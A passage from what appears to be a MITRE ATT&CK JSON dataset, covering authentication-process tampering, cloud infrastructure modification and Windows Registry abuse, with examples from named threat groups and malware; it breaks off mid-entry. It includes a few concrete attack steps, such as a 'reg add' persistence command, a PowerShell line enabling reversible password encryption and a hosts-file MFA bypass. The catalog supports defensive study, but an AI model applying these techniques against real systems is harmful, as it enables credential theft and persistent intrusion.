network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.", "id": "T1556", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury can intercept private keys using a trojanized ssh-add function."}, {"id": "G1016", "name": "FIN13", "description": "FIN13 has replaced legitimate KeePass binaries with trojanized versions to collect passwords from numerous applications."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has trojanized the ssh_login and user-auth_pubkey functions to steal plaintext credentials."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can create a backdoor in KeePass using a malicious config file and in TortoiseSVN using a registry hook."}], "sub_techniques": [{"name": "Domain Controller Authentication", "description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.", "detailed_description": "Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts.\nMalware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user\u2019s account and/or credentials (ex: Skeleton Key). Skeleton key works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system. Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller). Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments.", "id": "T1556.001", "examples": [{"id": "G0114", "name": "Chimera", "description": "Chimera's malware has altered the NTLM authentication program on domain controllers to allow Chimera to login without a valid credential."}, {"id": "S0007", "name": "Skeleton Key", "description": "Skeleton Key is used to patch an enterprise domain controller authentication process with a backdoor password. It allows adversaries to bypass the standard authentication system to use a defined password for all accounts authenticating to that domain controller."}]}, {"name": "Password Filter DLL", "description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.", "detailed_description": "Adversaries may register malicious password filter dynamic link libraries (DLLs) into the authentication process to acquire user credentials as they are validated.\nWindows password filters are password policy enforcement mechanisms for both domain and local accounts. Filters are implemented as DLLs containing a method to validate potential passwords against password policies. Filter DLLs can be positioned on local computers for local accounts and/or domain controllers for domain accounts. Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter. Any potential changes cannot take effect until every registered filter acknowledges validation.\nAdversaries can register malicious password filters to harvest credentials from local computers and/or entire domains. To perform proper validation, filters must receive plain-text credentials from the LSA. A malicious password filter would receive these plain-text credentials every time a password request is made.", "id": "T1556.002", "examples": [{"id": "S0125", "name": "Remsec", "description": "Remsec harvests plain-text credentials as a password filter registered on domain controllers."}, {"id": "G0041", "name": "Strider", "description": "Strider has registered its persistence module on domain controllers as a Windows LSA (Local System Authority) password filter to acquire credentials any time a domain, local user, or administrator logs in or changes a password."}]}, {"name": "Pluggable Authentication Modules", "description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.", "detailed_description": "Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is pam_unix.so, which retrieves, sets, and verifies account authentication information in /etc/passwd and /etc/shadow.\nAdversaries may modify components of the PAM system to create backdoors. PAM components, such as pam_unix.so, can be patched to accept arbitrary adversary supplied values as legitimate credentials.\nMalicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.", "id": "T1556.003", "examples": [{"id": "S0377", "name": "Ebury", "description": "Ebury can deactivate PAM modules to tamper with the sshd configuration."}, {"id": "S0468", "name": "Skidmap", "description": "Skidmap has the ability to replace the pam_unix.so file on an infected machine with its own malicious version that accepts a specific backdoor password for all users."}]}, {"name": "Network Device Authentication", "description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.", "detailed_description": "Adversaries may use Patch System Image to hard code a password in the operating system, thus bypassing of native authentication mechanisms for local accounts on network devices.\nModify System Image may include implanted code to the operating system for network devices to provide access for adversaries using a specific password.  The modification includes a specific password which is implanted in the operating system image via the patch.  Upon authentication attempts, the inserted code will first check to see if the user input is the password. If so, access is granted. Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials.", "id": "T1556.004", "examples": [{"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can modify LDAP and two factor authentication flows by inspecting login credentials and forcing successful authentication if the provided password matches a chosen backdoor password."}, {"id": "S0519", "name": "SYNful Knock", "description": "SYNful Knock has the capability to add its own custom backdoor password when it modifies the operating system of the affected network device."}]}, {"name": "Reversible Encryption", "description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.", "detailed_description": "An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems. The AllowReversiblePasswordEncryption property specifies whether reversible password encryption for an account is enabled or disabled. By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.\nIf the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled. To decrypt the passwords, an adversary needs four components:\nWith this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value.\nAn adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module. For example, an adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to \"Windows Server 2008\" or higher. In PowerShell, an adversary may make associated changes to user settings using commands similar to Set-ADUser -AllowReversiblePasswordEncryption $true.", "id": "T1556.005", "examples": []}, {"name": "Multi-Factor Authentication", "description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.", "detailed_description": "Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.\nOnce adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as Multi-Factor Authentication Request Generation, adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.\nFor example, modifying the Windows hosts file (C:\\windows\\system32\\drivers\\etc\\hosts) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a \"fail open\" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.\nDepending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.", "id": "T1556.006", "examples": [{"id": "S0677", "name": "AADInternals", "description": "The AADInternals Set-AADIntUserMFA command can be used to disable MFA for a specified user."}, {"id": "G1015", "name": "Scattered Spider", "description": "After compromising user accounts, Scattered Spider registers their own MFA tokens."}, {"id": "S1104", "name": "SLOWPULSE", "description": "SLOWPULSE can insert malicious logic to bypass RADIUS and ACE two factor authentication (2FA) flows if a designated attacker-supplied password is provided."}]}, {"name": "Hybrid Identity", "description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.", "detailed_description": "Adversaries may patch, modify, or otherwise backdoor cloud authentication processes that are tied to on-premises user identities in order to bypass typical authentication mechanisms, access credentials, and enable persistent access to accounts.\nMany organizations maintain hybrid user and device identities that are shared between on-premises and cloud-based environments. These can be maintained in a number of ways. For example, Microsoft Entra ID includes three options for synchronizing identities between Active Directory and Entra ID:\nAD FS can also be used with other SaaS and cloud platforms such as AWS and GCP, which will hand off the authentication process to AD FS and receive a token containing the hybrid users\u2019 identity and privileges.\nBy modifying authentication processes tied to hybrid identities, an adversary may be able to establish persistent privileged access to cloud resources. For example, adversaries who compromise an on-premises server running a PTA agent may inject a malicious DLL into the AzureADConnectAuthenticationAgentService process that authorizes all attempts to authenticate to Entra ID, as well as records user credentials. In environments using AD FS, an adversary may edit the Microsoft.IdentityServer.Servicehost configuration file to load a malicious DLL that generates authentication tokens for any user with any set of claims, thereby bypassing multi-factor authentication and defined AD FS policies.\nIn some cases, adversaries may be able to modify the hybrid identity authentication process from the cloud. For example, adversaries who compromise a Global Administrator account in an Entra ID tenant may be able to register a new PTA agent via the web console, similarly allowing them to harvest credentials and log into the Entra ID environment as any user.", "id": "T1556.007", "examples": [{"id": "S0677", "name": "AADInternals", "description": "AADInternals can inject a malicious DLL (PTASpy) into the AzureADConnectAuthenticationAgentService to backdoor Azure AD Pass-Through Authentication."}, {"id": "G0016", "name": "APT29", "description": "APT29 has edited the Microsoft.IdentityServer.Servicehost.exe.config file to load a malicious DLL into the AD FS process, thereby enabling persistent access to any service federated with AD FS for a user with a specified User Principal Name."}]}, {"name": "Network Provider DLL", "description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.", "detailed_description": "Adversaries may register malicious network provider dynamic link libraries (DLLs) to capture cleartext user credentials during the authentication process. Network provider DLLs allow Windows to interface with specific network protocols and can also support add-on credential management functions. During the logon process, Winlogon (the interactive logon module) sends credentials to the local mpnotify.exe process via RPC. The mpnotify.exe process then shares the credentials in cleartext with registered credential managers when notifying that a logon event is happening.\nAdversaries can configure a malicious network provider DLL to receive credentials from mpnotify.exe. Once installed as a credential manager (via the Registry), a malicious DLL can receive and save credentials each time a user logs onto a Windows workstation or domain via the NPLogonNotify() function.\nAdversaries may target planting malicious network provider DLLs on systems known to have increased logon activity and/or administrator logon activity, such as servers and domain controllers.", "id": "T1556.008", "examples": []}, {"name": "Conditional Access Policies", "description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.", "detailed_description": "Adversaries may disable or modify conditional access policies to enable persistent access to compromised accounts. Conditional access policies are additional verifications used by identity providers and identity and access management systems to determine whether a user should be granted access to a resource.\nFor example, in Entra ID, Okta, and JumpCloud, users can be denied access to applications based on their IP address, device enrollment status, and use of multi-factor authentication. In some cases, identity providers may also support the use of risk-based metrics to deny sign-ins based on a variety of indicators. In AWS and GCP, IAM policies can contain condition attributes that verify arbitrary constraints such as the source IP, the date the request was made, and the nature of the resources or regions being requested. These measures help to prevent compromised credentials from resulting in unauthorized access to data or resources, as well as limit user permissions to only those required.\nBy modifying conditional access policies, such as adding additional trusted IP ranges, removing Multi-Factor Authentication requirements, or allowing additional Unused/Unsupported Cloud Regions, adversaries may be able to ensure persistent access to accounts and circumvent defensive measures.", "id": "T1556.009", "examples": [{"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has added additional trusted locations to Azure AD conditional access policies. "}]}]}, {"name": "Modify Cloud Compute Infrastructure", "description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.", "detailed_description": "An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.\nPermissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence.", "id": "T1578", "examples": [], "sub_techniques": [{"name": "Create Snapshot", "description": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.", "detailed_description": "An adversary may create a snapshot or data backup within a cloud account to evade defenses. A snapshot is a point-in-time copy of an existing cloud compute component such as a virtual machine (VM), virtual hard drive, or volume. An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence.\nAn adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access.", "id": "T1578.001", "examples": [{"id": "S1091", "name": "Pacu", "description": "Pacu can create snapshots of EBS volumes and RDS instances."}]}, {"name": "Create Cloud Instance", "description": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.", "detailed_description": "An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defenses. Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account. An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging.\nCreating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances.", "id": "T1578.002", "examples": [{"id": "C0027", "name": "C0027", "description": "During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has created new virtual machines within the target's cloud environment after leveraging credential access to cloud assets."}, {"id": "G1015", "name": "Scattered Spider", "description": "During C0027, Scattered Spider used access to the victim's Azure tenant to create Azure VMs.Scattered Spider has also created Amazon EC2 instances within the victim's environment."}]}, {"name": "Delete Cloud Instance", "description": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.", "detailed_description": "An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence.  Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.\nAn adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives.", "id": "T1578.003", "examples": [{"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has deleted the target's systems and resources in the cloud to trigger the organization's incident and crisis response process."}]}, {"name": "Revert Cloud Instance", "description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.", "detailed_description": "An adversary may revert changes made to a cloud instance after they have performed malicious activities in attempt to evade detection and remove evidence of their presence. In highly virtualized environments, such as cloud-based infrastructure, this may be accomplished by restoring virtual machine (VM) or data storage snapshots through the cloud management dashboard or cloud APIs.\nAnother variation of this technique is to utilize temporary storage attached to the compute instance. Most cloud providers provide various types of storage including persistent, local, and/or ephemeral, with the ephemeral types often reset upon stop/restart of the VM.", "id": "T1578.004", "examples": []}, {"name": "Modify Cloud Compute Configurations", "description": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.", "detailed_description": "Adversaries may modify settings that directly affect the size, locations, and resources available to cloud compute infrastructure in order to evade defenses. These settings may include service quotas, subscription associations, tenant-wide policies, or other configurations that impact available compute. Such modifications may allow adversaries to abuse the victim\u2019s compute resources to achieve their goals, potentially without affecting the execution of running instances and/or revealing their activities to the victim.\nFor example, cloud providers often limit customer usage of compute resources via quotas. Customers may request adjustments to these quotas to support increased computing needs, though these adjustments may require approval from the cloud provider. Adversaries who compromise a cloud environment may similarly request quota adjustments in order to support their activities, such as enabling additional Resource Hijacking without raising suspicion by using up a victim\u2019s entire quota. Adversaries may also increase allowed resource usage by modifying any tenant-wide policies that limit the sizes of deployed virtual machines.\nAdversaries may also modify settings that affect where cloud resources can be deployed, such as enabling Unused/Unsupported Cloud Regions.", "id": "T1578.005", "examples": []}]}, {"name": "Modify Cloud Resource Hierarchy", "description": "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.", "detailed_description": "Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses.\nIaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.\nAdversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim\u2019s compute resources without generating logs on the victim tenant.\nIn AWS environments, adversaries with appropriate permissions in a given account may call the LeaveOrganization API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the CreateAccount API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.", "id": "T1666", "examples": [], "sub_techniques": []}, {"name": "Modify Registry", "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.", "detailed_description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.\nAccess to specific areas of the Registry depends on account permissions, some requiring administrator-level access. The built-in Windows command-line utility Reg may be used for local or remote Registry modification.  Other tools may also be used, such as a remote access tool, which may contain functionality to interact with the Registry through the Windows API.\nRegistry modifications may also include actions to hide keys, such as prepending key names with a null character, which will cause an error and/or be ignored when read via Reg or other utilities using the Win32 API.  Adversaries may abuse these pseudo-hidden keys to conceal payloads/commands used to maintain persistence.\nThe Registry of a remote system may be modified to aid in execution of files as part of lateral movement. It requires the remote Registry service to be running on the target system.  Often Valid Accounts are required, along with access to the remote system's SMB/Windows Admin Shares for RPC communication.", "id": "T1112", "examples": [{"id": "C0028", "name": "2015 Ukraine Electric Power Attack", "description": "During the 2015 Ukraine Electric Power Attack, Sandworm Team modified in-registry Internet settings to lower internet security before launching rundll32.exe, which in-turn launches the malware and communicates with C2 servers over the Internet. ."}, {"id": "S0677", "name": "AADInternals", "description": "AADInternals can modify registry keys as part of setting a new pass-through authentication agent."}, {"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL is capable of setting and deleting Registry values."}, {"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can achieve persistence by modifying Registry key entries."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has overwritten registry keys for persistence."}, {"id": "G0073", "name": "APT19", "description": "APT19 uses a Port 22 malware variant to modify several Registry keys."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor has modified the Windows Registry to store the backdoor's configuration. "}, {"id": "G0082", "name": "APT38", "description": "APT38 uses a tool called CLEANTOAD that has the capability to modify Registry keys."}, {"id": "G0096", "name": "APT41", "description": "APT41 used a malware variant called GOODLUCK to modify the registry in order to steal credentials."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda modified the victim registry to enable the RestrictedAdmin mode feature, allowing for pass the hash behaviors to function via RDP."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can modify the Run registry key."}, {"id": "S0640", "name": "Avaddon", "description": "Avaddon modifies several registry keys for persistence and UAC bypass."}, {"id": "S0031", "name": "BACKSPACE", "description": "BACKSPACE is capable of deleting Registry keys, sub-keys, and values on a victim system."}, {"id": "S0245", "name": "BADCALL", "description": "BADCALL modifies the firewall Registry key SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfileGloballyOpenPorts\\List."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot writes data into the Registry key HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Pniumj."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has deleted Registry keys to clean up its prior activity."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer can set values in the Registry to help in execution."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can modify the Registry to enable itself to run in safe mode and to modify the icons and file extensions for encrypted files."}, {"id": "S1068", "name": "BlackCat", "description": "BlackCat has the ability to add the following registry key on compromised networks to maintain persistence: HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services \\LanmanServer\\Paramenters"}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used Windows Registry modifications to specify a DLL payload."}, {"id": "S0348", "name": "Cardinal RAT", "description": "Cardinal RAT sets HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load to point to its executable."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas creates three Registry keys to establish persistence by adding a Windows Service."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a command to modify a Registry key."}, {"id": "S0631", "name": "Chaes", "description": "Chaes can modify Registry values to stored information and establish persistence."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can remove persistence-related artifacts from the Registry."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP can use the Windows Registry Environment key to change the %windir% variable to point to c:\\Windows to enable payload execution."}, {"id": "S0023", "name": "CHOPSTICK", "description": "CHOPSTICK may modify Registry keys to store RC4 encrypted configuration information."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can set and delete Registry keys."}, {"id": "S0611", "name": "Clop", "description": "Clop can make modifications to Registry keys."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can modify Registry values within HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\ to enable the execution of additional code."}, {"id": "S0126", "name": "ComRAT", "description": "ComRAT has modified Registry values to store encrypted orchestrator code and payloads."}, {"id": "S0608", "name": "Conficker", "description": "Conficker adds keys to the Registry at HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services and various other Registry locations."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can create a registry key using wdigest."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can set a Registry key to determine how long it has been installed and possibly to indicate the version number."}, {"id": "S0527", "name": "CSPY Downloader", "description": "CSPY Downloader can write to the Registry under the %windir% variable to execute tasks."}, {"id": "S0334", "name": "DarkComet", "description": "DarkComet adds a Registry value for its installation routine to the Registry Key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System Enable LUA=\"0\" and HKEY_CURRENT_USER\\Software\\DC3_FEXEC."}, {"id": "S1066", "name": "DarkTortilla", "description": "DarkTortilla has modified registry keys for persistence."}, {"id": "S0673", "name": "DarkWatchman", "description": "DarkWatchman can modify Registry values to store configuration strings, keylogger, and output of components."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has created Registry keys for persistence."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has modified the Registry to perform multiple techniques through the use of Reg."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca modified the registry using the command reg add \"HKEY_CURRENT_USER\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"[file path]\" for persistence."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear modifies registry values for anti-forensics and defense evasion purposes."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can make modifications to the Regsitry for persistence."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "Exaramel for Windows adds the configuration to the Registry in XML format."}, {"id": "S0569", "name": "Explosive", "description": "Explosive has a function to write itself to Registry values."}, {"id": "S0267", "name": "FELIXROOT", "description": "FELIXROOT deletes the Registry key HKCU\\Software\\Classes\\Applications\\rundll32.exe\\shell\\open."}, {"id": "S0679", "name": "Ferocious", "description": "Ferocious has the ability to add a Class ID in the current user Registry hive to enable persistence mechanisms."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has deleted Registry keys during post compromise cleanup activities."}, {"id": "G0047", "name": "Gamaredon Group", "description": "Gamaredon Group has removed security settings for VBA macro execution by changing registry values HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\VBAWarnings and HKCU\\Software\\Microsoft\\Office\\<version>\\<product>\\Security\\AccessVBOM."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can modify the Registry to store its components."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT has altered the InstallTime subkey."}, {"id": "G0078", "name": "Gorgon Group", "description": "Gorgon Group malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under HKCU\\Software\\Microsoft\\Office\\."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can modify the Registry to store its configuration at HKCU\\Software\\ under frequently changing names including %USERNAME% and ToolTech-RM."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy modifies conditions in the Registry and adds keys."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper has the ability to modify Registry keys to disable crash dumps, colors for compressed files, and pop-up information about folders and desktop items."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has modified Managed Object Format (MOF) files within the Registry to run specific commands and create persistence on the system."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates a Registry subkey to register its created service, and can also uninstall itself later by deleting this value. Hydraq's backdoor also enables remote attackers to modify and delete subkeys."}, {"id": "S0537", "name": "HyperStack", "description": "HyperStack can add the name of its communication pipe to HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters\\NullSessionPipes."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has modified registry keys to prepare for ransomware execution and to disable common administrative utilities."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole has a command to create, set, copy, or delete a specified Registry key or value."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper can make arbitrary changes to registry keys based on provided input."}, {"id": "S0271", "name": "KEYMARBLE", "description": "KEYMARBLE has a command to create Registry entries for storing data under HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\WABE\\DataPath."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has modified Registry settings for default file associations to enable all macros and for persistence."}, {"id": "S0669", "name": "KOCTOPUS", "description": "KOCTOPUS has added and deleted keys from the Registry."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has modified registry keys of ComSysApp, Svchost, and xmlProv on the machine to gain persistence."}, {"id": "S0397", "name": "LoJax", "description": "LoJax has modified the Registry key \u2018HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\BootExecute\u2019 from \u2018autocheck autochk \u2019 to \u2018autocheck autoche \u2019."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has modified the Registry as part of its UAC bypass process."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malware that adds Registry keys for persistence."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can manipulate the system registry on a compromised host."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has modified Registry settings for security tools."}, {"id": "S0576", "name": "MegaCortex", "description": "MegaCortex has added entries to the Registry for ransom contact information."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can write the process ID of a target process into the HKEY_LOCAL_MACHINE\\SOFTWARE\\DDE\\tpid Registry value as part of its reflective loading activity."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo has written process names to the Registry, disabled IE browser features, deleted Registry keys, and changed the ExtendedUIHoverTime key."}, {"id": "S1047", "name": "Mori", "description": "Mori can write data to HKLM\\Software\\NFC\\IPA and HKLM\\Software\\NFC\\ and delete Registry values."}, {"id": "S0256", "name": "Mosquito", "description": "Mosquito can modify Registry keys under HKCU\\Software\\Microsoft[dllname] to store configuration values. Mosquito also modifies Registry keys under HKCR\\CLSID...\\InprocServer32 with a path to the launcher."}, {"id": "S0205", "name": "Naid", "description": "Naid creates Registry entries that store information about a created service and point to a malicious DLL dropped to disk."}, {"id": "S0336", "name": "NanoCore", "description": "NanoCore has the capability to edit the Registry."}, {"id": "S0691", "name": "Neoichor", "description": "Neoichor has the ability to configure browser settings by modifying Registry entries under HKEY_CURRENT_USER\\Software\\Microsoft\\Internet Explorer."}, {"id": "S0210", "name": "Nerex", "description": "Nerex creates a Registry subkey that registers a new service."}, {"id": "S0457", "name": "Netwalker", "description": "Netwalker can add the following registry entry: HKEY_CURRENT_USER\\SOFTWARE{8 random characters}."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can modify the Registry to store its configuration information."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used zwShell to establish full remote control of the connected machine and manipulate the Registry."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can modify the Registry to set the ServiceDLL for a service created by the malware for persistence."}, {"id": "S0385", "name": "njRAT", "description": "njRAT can create, delete, or modify a specified Registry key or value."}, {"id": "S1131", "name": "NPPSPY", "description": "NPPSPY modifies the Registry to record the malicious listener for output from the Winlogon process."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors used batch files that modified registry keys."}, {"id": "C0014", "name": "Operation 